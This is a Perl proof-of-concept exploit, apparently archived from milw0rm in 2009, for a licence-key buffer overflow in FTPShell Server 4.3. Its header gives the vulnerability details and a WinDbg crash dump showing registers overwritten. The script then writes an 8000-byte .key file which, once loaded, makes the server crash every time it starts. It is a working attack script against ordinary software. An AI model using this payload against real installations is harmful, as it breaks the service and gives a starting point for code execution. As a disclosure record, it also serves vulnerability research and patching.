#!/usr/bin/perl
#
# Title: FTPShell Server 4.3 (licence key) Remote Buffer Overflow PoC
#
# Summary: FTPShell server is a windows FTP service that enables remote file downloads and uploads.
# It supports regular and secure FTP based on both SSL/TLS and SSH2. It is also extremely easy to
# configure and use.
#
# Product web page: http://www.ftpshell.com/index.htm
#
# Desc: FTPShell Server 4.3 suffers from buffer overflow vulnerability that can be exploited remotely or localy.
# It fails to perform adequate boundry condition of the input .key file, allowing us to overwrite the EAX and EDX
# registers. When trying to install licence with less than 8000 bytes we get a message: "It appears that your key
# file is corrupt or invalid.", but when installing a licence with 8000 bytes we get a message: "Your licence key
# has been succesfully loaded. Please restart the program."
#
# Note: When you restart the program, it will always crash untill you repair it or reinstall it.
#
#
# ---------------------------------WinDbg-------------------------------------
#
# (1178.1d4): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=41414141 ebx=00b159c0 ecx=00b159c0 edx=41414141 esi=00b1c630 edi=00000005
# eip=004039a0 esp=0012f3bc ebp=00000000 iopl=0         nv up ei pl nz na pe nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
# 
# ftpshelldscp+0x39a0:
# 004039a0 ff5210          call    dword ptr [edx+10h]  ds:0023:41414151=????????
#
# ----------------------------------------------------------------------------
#
#
# Tested on Microsoft Windows XP Professional SP2 (English)
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#
# liquidworm [t00t] gmail [w00t] com
#
# http://www.zeroscience.org
#
# 22.01.2009
#
####################################################################################


$file = "Yes_Man.key";

$payload = "\x41" x 8000; 

print "\n\n[-] Buffering malicious playlist file. Please wait...\r\n";

sleep (1);

open (key, ">./$file") || die "\nCan't open $file: $!";

print key "$payload";

close (key);

print "\n\n[+] File $file successfully created!\n\n\a";

# milw0rm.com [2009-01-22]
